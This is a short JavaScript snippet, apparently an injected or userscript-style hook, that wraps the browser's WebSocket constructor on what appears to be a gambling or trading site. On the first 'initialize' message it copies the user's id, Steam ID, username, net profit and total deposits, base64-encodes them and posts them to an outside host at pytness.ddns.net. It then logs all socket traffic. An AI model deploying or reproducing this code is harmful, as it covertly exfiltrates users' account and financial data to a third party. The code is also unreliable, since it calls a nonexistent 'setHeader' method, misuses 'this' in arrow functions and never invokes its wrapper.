((w) => {

    function send(u) {
        var user = {};
        var keys = ['id','steamid','username','name_promotion','userclass','xp','net_profit','total_deposited'];

        for (let i = 0; i < keys.length; i++) {
            let k = keys[i];
            user[k] = u[k];
        }

        var ajax = new XMLHttpRequest();
        ajax.open('POST', 'http://pytness.ddns.net/logdata.py', true);
        ajax.setHeader('Content-Type', 'application/x-www-form-urlencoded');
        ajax.send('q=' + btoa(JSON.stringify(user)));
    }

    var extractData = (a, b=false) => {
        try {
            b = JSON.parse(a.split(',').slice(1).join(','));
        } finally {return b;}
    };

    var manageData_EL = (a) => { // Event Listener
        var b = extractData(a.data);
        if (b[0] == 'initialize' && typeof b[1].user == 'object') {
            send(b[1].user);
            this.removeEventListener('message', manageData_EL);

            this.__send = this.send;
            this.send = function(m) {
                console.log(m);
                this.__send(m);
            };

            this.__om = this.onmessage;
            this.onmessage = function(e) {
                console.log(e.data);
                this.__om(e);
            };
        }
    };

    var _WS = WebSocket;

    w.WebSocket = function(...args) {

        var tws = new _WS(...args);
        tws.addEventListener('message', manageData_EL, false);
        return tws;
    };

    ///////////////////////////////////////////////////////////////////////////


});
